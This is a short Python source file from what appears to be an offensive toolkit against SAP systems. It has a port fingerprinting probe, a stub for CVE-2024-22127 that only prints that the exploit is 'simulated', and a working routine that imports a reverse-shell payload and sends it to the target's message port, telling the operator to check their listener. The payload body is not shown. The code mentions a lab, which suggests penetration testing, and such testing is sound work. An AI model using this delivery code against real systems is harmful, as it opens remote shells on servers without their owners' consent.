import socket, struct, time
from colorama import Fore
from payloads.diag_reverse import get_diag_payload

def fingerprint(host, port):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))
        s.send(b"\x00\x00\x00\x01")
        resp = s.recv(100)
        if b"SAP" in resp or len(resp) > 0:
            print(f"{Fore.GREEN}[+] SAP service detected on {host}:{port}{Fore.RESET}")
            return True
    except:
        pass
    return False

def cve_2024_22127(host, port, sysnr, lhost, lport):
    print(f"{Fore.RED}[+] Exploiting CVE-2024-22127 (simulated)...{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Payload would be sent to SAP Gateway{Fore.RESET}")

def diag_reverse_shell(host, port, lhost, lport):
    print(f"{Fore.RED}[+] Sending DIAG reverse shell...{Fore.RESET}")
    try:
        payload = get_diag_payload(lhost, lport)
        s = socket.socket()
        s.settimeout(10)
        msg_port = int(port) + 300 if int(port) < 4000 else int(port)
        s.connect((host, msg_port))
        header = struct.pack(">III", 0, len(payload) + 20, 1)
        s.send(header + payload)
        time.sleep(2)
        print(f"{Fore.GREEN}[+] DIAG reverse shell sent â†’ check listener!{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.YELLOW}[-] DIAG failed (normal in lab): {e}{Fore.RESET}")
